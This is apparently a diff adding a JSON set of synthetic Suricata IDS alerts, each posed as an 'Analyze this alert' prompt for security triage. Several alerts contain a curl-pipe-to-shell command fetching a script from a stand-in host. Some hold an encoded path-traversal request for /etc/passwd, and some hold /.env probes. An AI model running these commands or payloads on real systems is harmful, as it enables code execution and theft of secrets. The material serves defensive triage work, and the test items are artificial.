@@ -1,0 +1,114 @@
+[
+  {
+    "id": "A004",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Outbound Transfer to Uncommon Destination\ncategory=dataflow\nseverity_prior=medium\nbytes_out=734000000\ndst_port=8443\ndns_query=cdn-edge-77.blobstore-eu.net\nsrc_ip=74.254.166.139\nrule_id=SID-2000004\ndetect_time=2026-09-02T13:05:00Z\ndst_ip=10.20.2.64\nsrc_port=51354\nduration_ms=8204\nbytes_in=2919\nconn_count=2"
+  },
+  {
+    "id": "A002",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Web Request With Encoded Parameters\ncategory=web\nseverity_prior=low\nhttp_status=200\nconn_count=96\nuri=/.env\nsrc_ip=46.194.12.72\ndst_port=443\nrule_id=SID-2000002\ndetect_time=2026-09-01T17:15:00Z\ndst_ip=10.20.4.46\nsrc_port=13131\nduration_ms=275\nbytes_in=5774\nbytes_out=1147\nuser_agent=Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+  },
+  {
+    "id": "A001",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Process Spawned by Web Service Account\ncategory=host\nseverity_prior=medium\nconn_count=14\nsrc_ip=33.223.193.32\ndst_port=443\nrule_id=SID-2000001\ndetect_time=2026-09-10T17:41:00Z\ndst_ip=10.20.4.125\nsrc_port=45929\nduration_ms=8997\nbytes_in=5304\nbytes_out=7574\nusername=svc_backup"
+  },
+  {
+    "id": "A006",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Web Request With Encoded Parameters\ncategory=web\nseverity_prior=low\nhttp_status=200\nconn_count=96\nsrc_ip=95.11.105.195\ndst_port=443\nrule_id=SID-2000006\ndetect_time=2026-09-05T19:03:00Z\ndst_ip=10.20.1.107\nsrc_port=46089\nduration_ms=8700\nbytes_in=1313\nbytes_out=4790\ncmdline=/bin/sh -c 'curl -s 203.0.113.9/p.sh | sh'"
+  },
+  {
+    "id": "A015",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Multiple Failed Authentications\ncategory=auth\nseverity_prior=medium\nconn_count=388\nhttp_status=401\nsrc_ip=16.30.86.156\ndst_port=443\nrule_id=SID-2000015\ndetect_time=2026-09-03T09:22:00Z\ndst_ip=10.20.4.144\nsrc_port=19895\nduration_ms=143\nbytes_in=7048\nbytes_out=4650\ncmdline=/bin/sh -c 'curl -s 203.0.113.9/p.sh | sh'"
+  },
+  {
+    "id": "A017",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Web Request With Encoded Parameters\ncategory=web\nseverity_prior=low\nhttp_status=200\nconn_count=96\nsrc_ip=63.154.237.153\ndst_port=443\nrule_id=SID-2000017\ndetect_time=2026-09-10T21:45:00Z\ndst_ip=10.20.1.13\nsrc_port=2821\nduration_ms=8649\nbytes_in=2758\nbytes_out=8871\nusername=svc_backup"
+  },
+  {
+    "id": "A022",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Outbound Transfer to Uncommon Destination\ncategory=dataflow\nseverity_prior=medium\nbytes_out=734000000\ndst_port=8443\nsrc_ip=81.181.92.244\nrule_id=SID-2000022\ndetect_time=2026-09-09T00:27:00Z\ndst_ip=10.20.4.147\nsrc_port=48466\nduration_ms=391\nbytes_in=6695\nconn_count=5\nuri=/search?q=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  },
+  {
+    "id": "A003",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Multiple Failed Authentications\ncategory=auth\nseverity_prior=medium\nconn_count=388\nhttp_status=401\nsrc_ip=153.241.93.215\ndst_port=443\nrule_id=SID-2000003\ndetect_time=2026-09-02T21:58:00Z\ndst_ip=10.20.2.200\nsrc_port=38496\nduration_ms=4190\nbytes_in=3764\nbytes_out=2780\nuser_agent=Mozilla/5.0 (compatible; Nmap Scripting Engine)\nuri=/.env"
+  },
+  {
+    "id": "A012",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Multiple Failed Authentications\ncategory=auth\nseverity_prior=medium\nconn_count=388\nhttp_status=401\nsrc_ip=149.105.178.51\ndst_port=443\nrule_id=SID-2000012\ndetect_time=2026-09-08T01:19:00Z\ndst_ip=10.20.4.200\nsrc_port=20397\nduration_ms=5160\nbytes_in=5924\nbytes_out=8728\nuser_agent=Mozilla/5.0 (compatible; Nmap Scripting Engine)\nuri=/.env"
+  },
+  {
+    "id": "A019",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Outbound Transfer to Uncommon Destination\ncategory=dataflow\nseverity_prior=medium\nbytes_out=734000000\ndst_port=8443\nsrc_ip=220.251.84.252\nrule_id=SID-2000019\ndetect_time=2026-09-01T05:45:00Z\ndst_ip=10.20.1.144\nsrc_port=16670\nduration_ms=7054\nbytes_in=5030\nconn_count=21\nusername=svc_backup"
+  },
+  {
+    "id": "A011",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Process Spawned by Web Service Account\ncategory=host\nseverity_prior=medium\nconn_count=14\nsrc_ip=38.159.59.152\ndst_port=443\nrule_id=SID-2000011\ndetect_time=2026-09-05T13:24:00Z\ndst_ip=10.20.3.244\nsrc_port=39878\nduration_ms=6168\nbytes_in=4835\nbytes_out=2255\nuri=/search?q=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  },
+  {
+    "id": "A009",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Automated Scanner Signature\ncategory=recon\nseverity_prior=medium\nconn_count=612\nhttp_status=403\nsrc_ip=99.181.162.201\ndst_port=443\nrule_id=SID-2000009\ndetect_time=2026-09-06T17:03:00Z\ndst_ip=10.20.3.10\nsrc_port=43677\nduration_ms=6427\nbytes_in=5885\nbytes_out=8917\ncmdline=/bin/sh -c 'curl -s 203.0.113.9/p.sh | sh'"
+  },
+  {
+    "id": "A020",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Process Spawned by Web Service Account\ncategory=host\nseverity_prior=medium\nconn_count=14\ncmdline=/bin/sh -c 'curl -s 203.0.113.9/p.sh | sh'\nsrc_ip=88.89.230.10\ndst_port=443\nrule_id=SID-2000020\ndetect_time=2026-09-04T07:12:00Z\ndst_ip=10.20.3.247\nsrc_port=39039\nduration_ms=7997\nbytes_in=7477\nbytes_out=225"
+  },
+  {
+    "id": "A016",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Outbound Transfer to Uncommon Destination\ncategory=dataflow\nseverity_prior=medium\nbytes_out=734000000\ndst_port=8443\nsrc_ip=54.67.81.194\nrule_id=SID-2000016\ndetect_time=2026-09-06T13:00:00Z\ndst_ip=10.20.1.67\nsrc_port=63499\nduration_ms=7907\nbytes_in=911\nconn_count=3\nusername=svc_backup"
+  },
+  {
+    "id": "A027",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Web Request With Encoded Parameters\ncategory=web\nseverity_prior=low\nhttp_status=200\nconn_count=96\nsrc_ip=124.224.53.55\ndst_port=443\nrule_id=SID-2000027\ndetect_time=2026-09-04T17:16:00Z\ndst_ip=10.20.0.223\nsrc_port=20317\nduration_ms=2693\nbytes_in=7816\nbytes_out=142\ncmdline=/bin/sh -c 'curl -s 203.0.113.9/p.sh | sh'"
+  },
+  {
+    "id": "A013",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Automated Scanner Signature\ncategory=recon\nseverity_prior=medium\nconn_count=612\nhttp_status=403\nuri=/search?q=%2e%2e%2f%2e%2e%2fetc%2fpasswd\nsrc_ip=138.87.160.214\ndst_port=443\nrule_id=SID-2000013\ndetect_time=2026-09-10T00:56:00Z\ndst_ip=10.20.0.141\nsrc_port=34535\nduration_ms=2295\nbytes_in=3645\nbytes_out=2636"
+  },
+  {
+    "id": "A007",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Web Request With Encoded Parameters\ncategory=web\nseverity_prior=low\nhttp_status=200\nconn_count=96\nuri=/search?q=%2e%2e%2f%2e%2e%2fetc%2fpasswd\nsrc_ip=12.63.171.61\ndst_port=443\nrule_id=SID-2000007\ndetect_time=2026-09-06T03:47:00Z\ndst_ip=10.20.2.76\nsrc_port=19348\nduration_ms=569\nbytes_in=2917\nbytes_out=8943"
+  },
+  {
+    "id": "A018",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Multiple Failed Authentications\ncategory=auth\nseverity_prior=medium\nconn_count=388\nhttp_status=401\nsrc_ip=120.53.192.101\ndst_port=443\nrule_id=SID-2000018\ndetect_time=2026-09-05T00:24:00Z\ndst_ip=10.20.2.200\nsrc_port=40894\nduration_ms=5475\nbytes_in=829\nbytes_out=3930\ncmdline=/bin/sh -c 'curl -s 203.0.113.9/p.sh | sh'"
+  },
+  {
+    "id": "A000",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Process Spawned by Web Service Account\ncategory=host\nseverity_prior=medium\nconn_count=14\ncmdline=/bin/sh -c 'curl -s 203.0.113.9/p.sh | sh'\nsrc_ip=103.7.229.229\ndst_port=443\nrule_id=SID-2000000\ndetect_time=2026-09-02T21:58:00Z\ndst_ip=10.20.1.130\nsrc_port=54656\nduration_ms=6717\nbytes_in=5389\nbytes_out=8111"
+  },
+  {
+    "id": "A005",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Process Spawned by Web Service Account\ncategory=host\nseverity_prior=medium\nconn_count=14\nsrc_ip=204.243.234.93\ndst_port=443\nrule_id=SID-2000005\ndetect_time=2026-09-09T09:09:00Z\ndst_ip=10.20.0.205\nsrc_port=11608\nduration_ms=8599\nbytes_in=5727\nbytes_out=4428\nuser_agent=Mozilla/5.0 (compatible; Nmap Scripting Engine)\nuri=/.env"
+  },
+  {
+    "id": "A025",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Multiple Failed Authentications\ncategory=auth\nseverity_prior=medium\nconn_count=388\nhttp_status=401\nsrc_ip=38.28.148.52\ndst_port=443\nrule_id=SID-2000025\ndetect_time=2026-09-07T03:14:00Z\ndst_ip=10.20.3.142\nsrc_port=61940\nduration_ms=2844\nbytes_in=982\nbytes_out=1592\ncmdline=/bin/sh -c 'curl -s 203.0.113.9/p.sh | sh'"
+  },
+  {
+    "id": "A023",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Process Spawned by Web Service Account\ncategory=host\nseverity_prior=medium\nconn_count=14\nsrc_ip=183.154.140.118\ndst_port=443\nrule_id=SID-2000023\ndetect_time=2026-09-01T02:11:00Z\ndst_ip=10.20.2.9\nsrc_port=21036\nduration_ms=5393\nbytes_in=1825\nbytes_out=6241\nuri=/search?q=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  },
+  {
+    "id": "A010",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Automated Scanner Signature\ncategory=recon\nseverity_prior=medium\nconn_count=612\nhttp_status=403\nuri=/.env\nuser_agent=Mozilla/5.0 (compatible; Nmap Scripting Engine)\nsrc_ip=43.71.151.154\ndst_port=443\nrule_id=SID-2000010\ndetect_time=2026-09-03T20:36:00Z\ndst_ip=10.20.4.96\nsrc_port=1797\nduration_ms=1269\nbytes_in=8540\nbytes_out=5930"
+  },
+  {
+    "id": "A021",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Process Spawned by Web Service Account\ncategory=host\nseverity_prior=medium\nconn_count=14\nsrc_ip=123.242.40.215\ndst_port=443\nrule_id=SID-2000021\ndetect_time=2026-09-10T22:17:00Z\ndst_ip=10.20.4.140\nsrc_port=14284\nduration_ms=985\nbytes_in=6157\nbytes_out=6929\nusername=svc_backup"
+  },
+  {
+    "id": "A024",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Multiple Failed Authentications\ncategory=auth\nseverity_prior=medium\nconn_count=388\nhttp_status=401\nsrc_ip=124.207.190.238\ndst_port=443\nrule_id=SID-2000024\ndetect_time=2026-09-02T02:17:00Z\ndst_ip=10.20.3.196\nsrc_port=48937\nduration_ms=7382\nbytes_in=8579\nbytes_out=7048\ncmdline=/bin/sh -c 'curl -s 203.0.113.9/p.sh | sh'"
+  },
+  {
+    "id": "A014",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Web Request With Encoded Parameters\ncategory=web\nseverity_prior=low\nhttp_status=200\nconn_count=96\nuri=/.env\nsrc_ip=129.16.59.12\ndst_port=443\nrule_id=SID-2000014\ndetect_time=2026-09-03T19:41:00Z\ndst_ip=10.20.4.46\nsrc_port=58063\nduration_ms=4230\nbytes_in=8731\nbytes_out=1395\nuser_agent=Mozilla/5.0 (compatible; Nmap Scripting Engine)"
+  },
+  {
+    "id": "A026",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Outbound Transfer to Uncommon Destination\ncategory=dataflow\nseverity_prior=medium\nbytes_out=734000000\ndst_port=8443\nsrc_ip=68.48.79.241\nrule_id=SID-2000026\ndetect_time=2026-09-10T20:08:00Z\ndst_ip=10.20.3.177\nsrc_port=21462\nduration_ms=8618\nbytes_in=7107\nconn_count=26\nuser_agent=Mozilla/5.0 (compatible; Nmap Scripting Engine)\nuri=/.env"
+  },
+  {
+    "id": "A008",
+    "prompt": "Analyze this alert:\nids_engine=suricata\nsensor=dmz-sensor-01\nproto=tcp\nsignature=Web Request With Encoded Parameters\ncategory=web\nseverity_prior=low\nhttp_status=200\nconn_count=96\nsrc_ip=183.82.134.227\ndst_port=443\nrule_id=SID-2000008\ndetect_time=2026-09-05T05:39:00Z\ndst_ip=10.20.0.96\nsrc_port=60227\nduration_ms=1754\nbytes_in=4974\nbytes_out=8854\ncmdline=/bin/sh -c 'curl -s 203.0.113.9/p.sh | sh'"
+  }
+]
